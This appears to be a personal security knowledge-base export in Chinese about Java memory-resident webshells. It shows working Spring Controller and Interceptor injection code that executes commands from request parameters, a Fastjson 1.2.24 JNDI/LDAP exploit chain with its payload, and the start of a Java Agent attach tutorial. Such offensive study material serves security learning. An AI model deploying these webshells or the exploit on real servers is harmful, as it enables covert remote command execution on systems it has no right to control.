另外，它增加了企业所需要的功能，比如，从属性文件从解析文本信息和将事件传递给所指定的监听器。 ApplicationContext 接口继承了 BeanFactory 接口，并通过继承其他接口进一步扩展了基本容器的功能。 因此，org.springframework.context.ApplicationContext接口也代表了 IoC容器 ，它负责实例化、定位、配置应用程序中的对象(bean)及建立这些对象间(beans)的依赖。 IoC容器通过读取配置元数据来获取对象的实例化、配置和组装的描述信息。配置的零元数据可以用xml、Java注解或Java代码来表示。 其他 Root Context 和 Child Context Spring 应用中可以同时有多个 Context，其中只有一个 Root Context，剩下的全是 Child Context 所有Child Context都可以访问在 Root Context中定义的 bean，但是Root Context无法访问Child Context中定义的 bean 所有的Context在创建后，都会被作为一个属性添加到了 ServletContext 中 ContextLoaderListener ContextLoaderListener 主要被用来初始化全局唯一的Root Context，即 Root WebApplicationContext。这个 Root WebApplicationContext 会和其他 Child Context 实例共享它的 IoC 容器，供其他 Child Context 获取并使用容器中的 bean DispatcherServlet DispatcherServlet 的主要作用是处理传入的web请求，根据配置的 URL pattern，将请求分发给正确的 Controller 和 View。DispatcherServlet 初始化完成后，会创建一个普通的 Child Context 实例。 从下面的继承关系图中可以发现： DispatcherServlet 从本质上来讲是一个 Servlet（扩展了 HttpServlet )。 每个具体的 DispatcherServlet 创建的是一个 Child Context，代表一个独立的 IoC 容器；而 ContextLoaderListener 所创建的是一个 Root Context，代表全局唯一的一个公共 IoC 容器。 如果要访问和操作 bean ，一般要获得当前代码执行环境的IoC容器，代表者 ApplicationContext。 Controller实现方式 要达到访问一个URL，访问到内存中的Webshell获得回显的效果，主要的方式如下： 在不使用注解和修改配置文件的情况下，使用纯 java 代码来获得当前代码运行时的上下文环境； 在不使用注解和修改配置文件的情况下，使用纯 java 代码在上下文环境中手动注册一个 controller； controller 中写入 Webshell 逻辑，达到和 Webshell 的 URL 进行交互回显的效果 Controller技术实现 获取上下文的环境 大佬提供了4种方法： WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext(); WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext()); WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()); WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); 我都试了一下，spring-boot-starter-parent 2.4.3中只有第四种方法可以成功获得Context 手动注册Controller 处理 URL 映射相关的类都实现了 HandlerMapping 接口 Spring 2.5 开始到 Spring 3.1 之前一般使用org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping 映射器 ； Spring 3.1 开始及以后一般开始使用新的org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping 映射器来支持@Contoller和@RequestMapping注解。 当然，也有高版本依旧使用旧映射器的情况。因此正常程序的上下文中一般存在其中一种映射器的实例 bean。又因版本不同和较多的接口等原因，手工注册动态 controller 的方法不止一种。 方法一:registerMapping 在 spring 4.0 及以后，可以使用 registerMapping 直接注册 requestMapping ，这是最直接的一种方式。 相关示例代码和解释如下： // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class); // 2. 通过反射获得自定义 controller 中唯一的 Method 对象 Method method = (Class.forName(\"com.example.demo.Test\").getDeclaredMethods())[0]; // 3. 定义访问 controller 的 URL 地址 PatternsRequestCondition url = new PatternsRequestCondition(\"/hahaha\"); // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST） RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 5. 在内存中动态注册 controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); r.registerMapping(info, Class.forName(\"com.example.demo.Test\").newInstance(), method); 这里只要让这些代码能够运行就行，我写到Controller里面的 com.example.demo.Test package com.example.demo; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; public class Test { public void test(HttpServletRequest request, HttpServletResponse response) throws IOException { response.getWriter().write(\"ADD CONTROLLER\"); } } 效果 方法二:registerHandler 该方法接受 urlPath参数和 handler参数，可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 将 url 和 controller 实例 bean 注册到 handlerMap 中。 我没成功，怀疑是spring版本问题 // 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean context.getBeanFactory().registerSingleton(\"dynamicController\", Class.forName(\"com.example.demo.Test\").newInstance()); // 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class); // 3. 反射获得 registerHandler Method java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(\"registerHandler\", String.class, Object.class); m1.setAccessible(true); // 4. 将 dynamicController 和 URL 注册到 handlerMap 中 m1.invoke(dh, \"/favicon\", \"dynamicController\"); 方法三：detectHandlerMethods 该方法仅接受handler参数，同样可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 并注册 controller 的实例 bean。 仍然没成功 context.getBeanFactory().registerSingleton(\"dynamicController\", Class.forName(\"com.example.demo.Test\").newInstance()); org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class); java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(\"detectHandlerMethods\", Object.class); m1.setAccessible(true); m1.invoke(requestMappingHandlerMapping, \"dynamicController\"); webshell 就注入一个恶意的controller，然后这个controller中url对应的函数是执行命令的即可，简单示例 主要是给路由和恶意方法绑定即可 // com.example.demo.Test package com.example.demo; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.*; public class Test { public void test(HttpServletRequest request, HttpServletResponse response) throws IOException { String cmd = request.getParameter(\"cmd\"); if(cmd != null){ Process exec = Runtime.getRuntime().exec(cmd); InputStream inputStream = exec.getInputStream(); DataInputStream dataInputStream = new DataInputStream(inputStream); String disr = dataInputStream.readLine(); while ( disr != null ) { response.getWriter().write(disr); disr = dataInputStream.readLine(); } } else { response.getWriter().write(\"ADD CONTROLLER\"); } } } // 注册Controller WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class); // 2. 通过反射获得自定义 controller 中唯一的 Method 对象 Method method = (Class.forName(\"com.example.demo.Test\").getDeclaredMethods())[0]; // 3. 定义访问 controller 的 URL 地址 PatternsRequestCondition url = new PatternsRequestCondition(\"/hahaha\"); // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST） RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 5. 在内存中动态注册 controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); r.registerMapping(info, Class.forName(\"com.example.demo.Test\").newInstance(), method); 注意事项 不同的映射处理器 如下面的配置，当有些老旧的项目中使用旧式注解映射器时，上下文环境中没有 RequestMappingHandlerMapping 实例的 bean，但会存在 DefaultAnnotationHandlerMapping 的实例 bean。 SpringBoot生命周期 上面过了一遍，感觉还是有点迷茫，可以调试一下spring的整个处理过程 一个请求到到应用层之前，需要经过那几个部分？是如何一步一步到到我们的Controller的? 编写一个正常的controller package com.example.demo; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; @RestController @RequestMapping(\"/test\") public class HelloController { @GetMapping(\"/hello\") public static String hello() { return \"123\"; } } 然后下断点，观察整个流程，查看堆栈信息 hello:16, HelloController (com.example.demo) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) doInvoke:197, InvocableHandlerMethod (org.springframework.web.method.support) invokeForRequest:141, InvocableHandlerMethod (org.springframework.web.method.support) invokeAndHandle:106, ServletInvocableHandlerMethod (org.springframework.web.servlet.mvc.method.annotation) invokeHandlerMethod:895, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation) handleInternal:808, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation) handle:87, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method) doDispatch:1064, DispatcherServlet (org.springframework.web.servlet) ⭐️ doService:963, DispatcherServlet (org.springframework.web.servlet) processRequest:1006, FrameworkServlet (org.springframework.web.servlet) doGet:898, FrameworkServlet (org.springframework.web.servlet) service:655, HttpServlet (javax.servlet.http) service:883, FrameworkServlet (org.springframework.web.servlet) service:764, HttpServlet (javax.servlet.http) internalDoFilter:228, ApplicationFilterChain (org.apache.catalina.core) 【5】 doFilter:163, ApplicationFilterChain (org.apache.catalina.core) doFilter:53, WsFilter (org.apache.tomcat.websocket.server) internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core) 【4】 doFilter:163, ApplicationFilterChain (org.apache.catalina.core) doFilterInternal:100, RequestContextFilter (org.springframework.web.filter) doFilter:119, OncePerRequestFilter (org.springframework.web.filter) internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core) 【3】 doFilter:163, ApplicationFilterChain (org.apache.catalina.core) doFilterInternal:93, FormContentFilter (org.springframework.web.filter) doFilter:119, OncePerRequestFilter (org.springframework.web.filter) internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core) 【2】 doFilter:163, ApplicationFilterChain (org.apache.catalina.core) doFilterInternal:201, CharacterEncodingFilter (org.springframework.web.filter) doFilter:119, OncePerRequestFilter (org.springframework.web.filter) internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core) 【1】 doFilter:163, ApplicationFilterChain (org.apache.catalina.core) invoke:202, StandardWrapperValve (org.apache.catalina.core) invoke:97, StandardContextValve (org.apache.catalina.core) invoke:542, AuthenticatorBase (org.apache.catalina.authenticator) invoke:143, StandardHostValve (org.apache.catalina.core) invoke:92, ErrorReportValve (org.apache.catalina.valves) invoke:78, StandardEngineValve (org.apache.catalina.core) service:357, CoyoteAdapter (org.apache.catalina.connector) service:382, Http11Processor (org.apache.coyote.http11) process:65, AbstractProcessorLight (org.apache.coyote) process:893, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1723, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:49, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:748, Thread (java.lang) 可以看到通过多次的org.apache.catalina.core.ApplicationFilterChain#internalDoFilter过滤处理后，会进入到调度方法org.springframework.web.servlet.DispatcherServlet#doDispatch中 在调度方法中重新下断点，分析调度过程，执行到getHandler方法，从注释也可以看出来，是用来确定当前请求的处理程序，跟进 可以看到是遍历this.handlerMappings 这个迭代器中的mapping的getHandler方法处理http中的request请求 通过requestMappingHandlerMapping这个bean获取到了handler，但是怎么获取到的呢？我们继续跟进getHandler 可以看到最后返回的是executionChain，也就是我们刚才的那个handler，这个变量是怎么得来的，继续跟getHandlerExecutionChain() 在org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandlerExecutionChain中把所有拦截器都加入到chain中并返回 从上面的分析我们知道在哪加入拦截器了，然后在doDispatch()中继续向下分析，发现会调用applyPreHandler，字面意思翻译过来就是预处理 跟进，发现会执行每个拦截器的preHandle()方法 如果程序提前在调用的 Controller 上设置了 Aspect（切面），那么在正式调用 Controller 前实际上会先调用切面的代码，一定程度上也起到了 \"拦截\" 的效果。 总结一下，一个 request 发送到 spring 应用，大概会经过以下几个层面才会到达处理业务逻辑的 Controller 层： HttpRequest --> Filter --> DispactherServlet --> Interceptor --> Aspect --> Controller 上面我们实现了controller的内存马，同理，拦截器Interceptor的内存马也是可以实现的，实现方法类似，都是需要先获得上下文，然后注册进去。 Interceptor实现 从上面的分析，也可以看出，我们想要的目的，就是实现一个恶意的拦截器，然后让拦截器执行preHandler方法，其中preHandler方法的内容就是我们的恶意代码 Interceptor 的拦截范围其实就是Controller方法，它实际上就相当于基于AOP的方法拦截。因为Interceptor只拦截Controller方法，所以要注意，返回ModelAndView后，后续对View的渲染就脱离了Interceptor的拦截范围。 一个Interceptor必须实现HandlerInterceptor接口（可以看上面的分析图，interceptor的类就是HandlerInterceptor），可以选择实现preHandle()、postHandle()和afterCompletion()方法。preHandle()是Controller方法调用前执行，postHandle()是Controller方法正常返回后执行，而afterCompletion()无论Controller方法是否抛异常都会执行，参数ex就是Controller方法抛出的异常（未抛出异常是null）。 在preHandle()中，也可以直接处理响应，然后返回false表示无需调用Controller方法继续处理了，通常在认证或者安全检查失败时直接返回错误响应。在postHandle()中，因为捕获了Controller方法返回的ModelAndView，所以可以继续往ModelAndView里添加一些通用数据，很多页面需要的全局数据如Copyright信息等都可以放到这里，无需在每个Controller方法中重复添加。 拦截器代码 实现一个拦截器 package com.example.demo; import org.springframework.web.servlet.HandlerInterceptor; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class TestInterceptor implements HandlerInterceptor { @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { response.getWriter().write(\"Interceptor test\"); return false; } } 正常注册拦截器 可以通过implements WebMvcConfigurer，重写其addInterceptors(InterceptorRegistry registry)方法 package com.example.demo; import org.springframework.context.annotation.Configuration; import org.springframework.web.servlet.config.annotation.InterceptorRegistry; import org.springframework.web.servlet.config.annotation.WebMvcConfigurer; @Configuration public class InterceptorConfig implements WebMvcConfigurer { @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(new TestInterceptor()).addPathPatterns(\"/test/hello\"); } } 效果 恶意注册拦截器 上面分析也看出来了，想要添加拦截器，就只需要动态添加到this.adaptedInterceptors数组中即可 所以我们的第一步是要获取到这个数组，而这个数组是在org.springframework.web.servlet.handler.AbstractHandlerMapping中实现的，AbstractHandlerMapping又是抽象类，所以我们需要找到它的实现类 下字段断点也可以找到它的实现类 org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping是一个不错的选择，可以通过context.getBean(\"org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping\");获取实例，然后再反射获取到adaptedInterceptors变量，最后添加恶意的拦截器即可 这里我尝试失败了，还是怀疑spring版本问题 所以利用代码 import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.servlet.handler.HandlerInterceptorAdapter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class TestInterceptor extends HandlerInterceptorAdapter { public TestInterceptor() throws NoSuchFieldException, IllegalAccessException, InstantiationException { // 获取context WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); // 从context中获取AbstractHandlerMapping的实例对象 org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(\"org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping\"); // 反射获取adaptedInterceptors属性 java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\"); field.setAccessible(true); java.util.ArrayList adaptedInterceptors = (java.util.ArrayList)field.get(abstractHandlerMapping); // 避免重复添加 for (int i = adaptedInterceptors.size() - 1; i > 0; i--) { if (adaptedInterceptors.get(i) instanceof TestInterceptor) { System.out.println(\"已经添加过TestInterceptor实例了\"); return; } } TestInterceptor aaa = new TestInterceptor(\"aaa\"); // 避免进入实例创建的死循环 adaptedInterceptors.add(aaa); // 添加全局interceptor } private TestInterceptor(String aaa){} @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { String code = request.getParameter(\"code\"); // 不干扰正常业务逻辑 if (code != null) { java.lang.Runtime.getRuntime().exec(code); return true; } else { return true; }}} 应用场景 既然是通过执行 java 代码内存注入 webshell，那么一般需要通过 Spring 相关的代码执行漏洞才可以利用，例如较为常见的 Java 反序列漏洞、普通的 JSP 文件 Webshell 转换成无文件 Webshell等。 主要目的是在当前JVM的环境下执行代码即可 漏洞演示 以Fastjson 1.2.24 的反序列化漏洞为例吧，先配置好环境（JDK pom.xml com.alibaba fastjson 1.2.24 Controller package com.example.demo; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; @RestController @RequestMapping(\"/test\") public class HelloController { @PostMapping(\"/hello\") public String hello(String json) { JSONObject jsonObject = JSON.parseObject(json); return jsonObject.toJSONString(); } } 编写恶意的类 import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition; import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition; import org.springframework.web.servlet.mvc.method.RequestMappingInfo; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.*; import java.lang.reflect.Method; public class Test { public Test() throws ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException { WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class); Method method = Test.class.getDeclaredMethod(\"test\", HttpServletRequest.class, HttpServletResponse.class); PatternsRequestCondition url = new PatternsRequestCondition(\"/hahaha\"); RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); r.registerMapping(info, new Test(\"aaa\"), method); } private Test(String aa){ // 不这样的话，上面22行会一直重复创建Test()对象，导致内存溢出 } public void test(HttpServletRequest request, HttpServletResponse response) throws IOException { String cmd = request.getParameter(\"cmd\"); if(cmd != null){ Process exec = Runtime.getRuntime().exec(cmd); InputStream inputStream = exec.getInputStream(); DataInputStream dataInputStream = new DataInputStream(inputStream); String disr = dataInputStream.readLine(); while ( disr != null ) { response.getWriter().write(disr); disr = dataInputStream.readLine(); } } else { response.getWriter().write(\"ADD CONTROLLER\"); } } } 编译成class文件 缺少依赖问题比较简单的解决方法，就是直接用IDEA编译的class，然后移动到其他目录即可 启动http服务 python3 -m http.server 8000 启动ldap服务 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#Test 8088 然后用fastjson payload打过去 { \"a\": { \"@type\": \"java.lang.Class\", \"val\": \"com.sun.rowset.JdbcRowSetImpl\" }, \"b\": { \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://127.0.0.1:8088/Test\", \"autoCommit\": true } } 效果 参考 深入浅出内存马(二) 之SpringBoot内存马（文末视频教学） 针对Spring MVC的Interceptor内存马 基于内存 Webshell 的无文件攻击技术研究 一文了解内存马： 最下面很多参考链接 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:02 "},"个人知识库/02.代码审计/01.Java安全/05.内存马/03.Java Agent 内存马.html":{"url":"个人知识库/02.代码审计/01.Java安全/05.内存马/03.Java Agent 内存马.html","title":"03.Java Agent 内存马","keywords":"","body":" 介绍 premain agentmain VirtualMachine 实现举例 Instrumentation 获取所有可修改类 修改类 ClassFileTransformer javassist 依赖 ClassPool CtClass CtMethod 示例 内存马 Spring Boot的Filter Java agent修改doFilter 拓展操作 查杀 风险 内存马复活 总览 介绍 Java agent是一种特殊的Java程序（Jar文件），它是Instrumentation的客户端。与普通Java程序通过main方法启动不同，agent并不是一个可以单独启动的程序，而必须依附在一个Java应用程序（JVM）上，与它运行在同一个进程中，通过Instrumentation API与虚拟机交互。 在注入内存马的过程中，我们可以利用java instrumentation机制，动态的修改已加载到内存中的类里的方法，进而注入恶意的代码。 java作为一种强类型的语言，不通过编译就不能够进行jar包的生成。而有了java agent技术，就可以在字节码这个层面对类和方法进行修改。同时，也可以把java agent理解成一种代码注入的方式。但是这种注入比起spring的aop更加的优美。 Java agent的使用方式有两种： 实现premain方法，在JVM启动前加载。 实现agentmain方法，在JVM启动后加载。 premain和agentmain函数声明如下，拥有Instrumentation inst参数的方法优先级更高： public static void agentmain(String agentArgs, Instrumentation inst) { ... } public static void agentmain(String agentArgs) { ... } public static void premain(String agentArgs, Instrumentation inst) { ... } public static void premain(String agentArgs) { ... } 第一个参数String agentArgs就是Java agent的参数。 第二个参数Instrumentation inst相当重要，inst 是一个 java.lang.instrument.Instrumentation 的实例，由 JVM 自动传入。java.lang.instrument.Instrumentation 是 instrument 包中定义的一个接口，也是这个包的核心部分，集中了其中几乎所有的功能方法，例如类定义的转换和操作等等。 premain 这里简单的举例说明premain的使用，创建一个maven项目 编写premain函数 import java.lang.instrument.Instrumentation; public class Main { public static void premain(String agentArgs, Instrumentation inst){ for(int i=0; i 在resources目录下创建META-INF/MANIFEST.MF，并指定Premain-Class；要注意的是，最后必须多一个换行。 Manifest-Version: 1.0 Premain-Class: Main 然后打包成jar文件，在Project Structure -> Artifacts -> JAR -> From modules with dependencies中配置 默认选项就行 然后选择Build -> Build Artifacts -> Build 会在out/artifacts/javaagent_jar目录下生成对应的jar文件 随便找个jar文件示例，比如我们写个hello word，使用 -javaagent:agent.jar 参数执行 java -javaagent:javaagent.jar -jar hello.jar 可以发现在hello.jar输出Hello world之前就执行了，具体执行流程大致如下 然而这种方法存在一定的局限性：只能在启动时使用-javaagent参数指定。 在实际环境中，目标的JVM通常都是已经启动的状态，无法预先加载premain。相比之下，agentmain更加实用。 agentmain 写一个agentmain和premain差不多，只需要在META-INF/MANIFEST.MF中加入Agent-Class:即可。 Manifest-Version: 1.0 Agent-Class: AgentMain 不同的是，这种方法不是通过JVM启动前的参数来指定的，官方为了实现启动后加载，提供了Attach API。Attach API 很简单，只有 2 个主要的类，都在 com.sun.tools.attach 包里面。着重关注的是VitualMachine这个类。 需要依赖VitualMachine的loadAgent达到attach的目的 VirtualMachine 字面意义表示一个Java 虚拟机，也就是程序需要监控的目标虚拟机，提供了获取系统信息、 loadAgent，attach 和 detach 等方法，可以实现的功能可以说非常之强大 。该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上 。代理类注入操作只是它众多功能中的一个，通过loadAgent方法向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例。 具体的用法看一下官方给的例子大概就理解了： // com.sun.tools.attach.VirtualMachine // 下面的示例演示如何使用VirtualMachine: // attach to target VM VirtualMachine vm = VirtualMachine.attach(\"2177\"); // start management agent Properties props = new Properties(); props.put(\"com.sun.management.jmxremote.port\", \"5000\"); vm.startManagementAgent(props); // detach vm.detach(); // 在此示例中，我们附加到由进程标识符2177标识的Java虚拟机。然后，使用提供的参数在目标进程中启动JMX管理代理。最后，客户端从目标VM分离。 下面列几个这个类提供的方法： com.sun.tools.attach.VirtualMachine public abstract class VirtualMachine { // 获得当前所有的JVM列表 public static List list() { ... } // 根据pid连接到JVM public static VirtualMachine attach(String id) { ... } // 断开连接 public abstract void detach() {} // 加载agent，agentmain方法靠的就是这个方法 public void loadAgent(String agent) { ... } } 实现举例 Attach.java（找到进程，加载agentMain.jar） import com.sun.tools.attach.AgentInitializationException; import com.sun.tools.attach.AgentLoadException; import com.sun.tools.attach.AttachNotSupportedException; import com.sun.tools.attach.VirtualMachine; import java.io.IOException; public class Attach { public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException { if(args.length == 2){ String pid = args[0]; String jarName = args[1]; System.out.println(\"attach 的 pid ==> \" + pid); System.out.println(\"attach 的 jarName ==> \" + jarName); // 连接到JVM VirtualMachine virtualMachine = VirtualMachine.attach(pid); // 加载agentmain virtualMachine.loadAgent(jarName); // 断开连接 virtualMachine.detach(); System.out.println(\"ends\"); } else{ System.out.println(\"至少2个参数\"); // 列出所有的jvm System.out.println(VirtualMachine.list()); } } } AgentMain.java（想要动态实现的代码） import java.lang.instrument.Instrumentation; public class AgentMain { public static void agentmain(String agentArgs, Instrumentation inst) { for(int i=0; i 可以写一起打包成一个jar，也可以分开打包成2个，问题都不大，只要MANIFST.MF没问题就行 Manifest-Version: 1.0 PreMain-Class: PreMain Agent-Class: AgentMain Main-Class: Attach 找一下想要操作的jvm的pid（也可以用上面的list()方法看到pid） 配置参数 java -jar attach.jar 63242 agentMain.jar 也可以手动在idea里面配置好 运行 转到我们想要attach的tomcat中看看效果 Instrumentation 刚才说了第二个参数Instrumentation inst相当重要，inst 是一个 java.lang.instrument.Instrumentation 的实例，由 JVM 自动传入。java.lang.instrument.Instrumentation 是 instrument 包中定义的一个接口，也是这个包的核心部分，集中了其中几乎所有的功能方法，例如类定义的转换和操作等等。 下面列出这个类的一些方法，更加详细的介绍和方法，可以参照官方文档，也可以看这个类源码里面的说明 public interface Instrumentation { // 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。 void addTransformer(ClassFileTransformer transformer, boolean canRetransform); // 删除一个类转换器 boolean removeTransformer(ClassFileTransformer transformer); // 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。 void retransformClasses(Class... classes) throws UnmodifiableClassException; // 判断目标类是否能够修改。 boolean isModifiableClass(Class theClass); // 获取目标已经加载的类。 @SuppressWarnings(\"rawtypes\") Class[] getAllLoadedClasses(); ...... } 获取所有可修改类 先介绍getAllLoadedClasses和isModifiableClasses。顾名思义： getAllLoadedClasses：获取所有已经加载的类。 isModifiableClasses：判断某个类是否能被修改。 修改刚才的AgentMain.java，并编译 import java.lang.instrument.Instrumentation; public class AgentMain { public static void agentmain(String agentArgs, Instrumentation inst) { Class[] allLoadedClasses = inst.getAllLoadedClasses(); for (Class cls : allLoadedClasses){ System.out.println(cls.getName()); System.out.print(\"isModifiableClass: \"); System.out.println(inst.isModifiableClass(cls)?\"true\":\"false\"); } } } 修改Attach.java,并重新attach到jvm中 import com.sun.tools.attach.AgentInitializationException; import com.sun.tools.attach.AgentLoadException; import com.sun.tools.attach.AttachNotSupportedException; import com.sun.tools.attach.VirtualMachine; import java.io.IOException; public class Attach { public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException { // 列出所有的jvm System.out.println(VirtualMachine.list()); String pid = \"68588\"; String jarName = \"/Users/d4m1ts/d4m1ts/java/javaagent/out/artifacts/javaagent_jar/javaagent.jar\"; // 连接到JVM VirtualMachine virtualMachine = VirtualMachine.attach(pid); // 加载agentmain virtualMachine.loadAgent(jarName); // 断开连接 virtualMachine.detach(); System.out.println(\"ends\"); } } 运行后 得到了目标JVM上所有已经加载的类，并且知道了这些类能否被修改 修改类 使用addTransformer()和retransformClasses()可以篡改Class的字节码 首先再看一下这两个方法的声明： public interface Instrumentation { // 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。 void addTransformer(ClassFileTransformer transformer, boolean canRetransform); // 删除一个类转换器 boolean removeTransformer(ClassFileTransformer transformer); // 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。 void retransformClasses(Class... classes) throws UnmodifiableClassException; ...... } 在addTransformer()方法中，有一个参数ClassFileTransformer transformer。这个参数将帮助我们完成字节码的修改工作。 ClassFileTransformer ClassFileTransformer也是一个接口，它提供了transform方法，此方法的实现可能会转换提供的类文件并返回新的替换类文件。 接口注释简单概括一下： 使用Instrumentation.addTransformer()来加载一个转换器。 转换器的返回结果（transform()方法的返回值）将成为转换后的字节码。 对于没有加载的类，会使用ClassLoader.defineClass()定义它；对于已经加载的类，会使用ClassLoader.redefineClasses()重新定义，并配合Instrumentation.retransformClasses进行转换。 现在已经知道了怎样能修改Class的字节码，具体的做法还需要用到另一个类库javassist来获取字节码，不了解的可以网上找文章了解下，可以简单理解为：通过这个类库可以直接创建一个class字节码文件 javassist 因为我们的目的只是修改某个类的某个方法，所以着重介绍下CtMethod，其他需要的简单过一下 依赖 org.javassist javassist 3.28.0-GA ClassPool 这个类是javassist的核心组件之一。 来看一下官方对他的介绍： 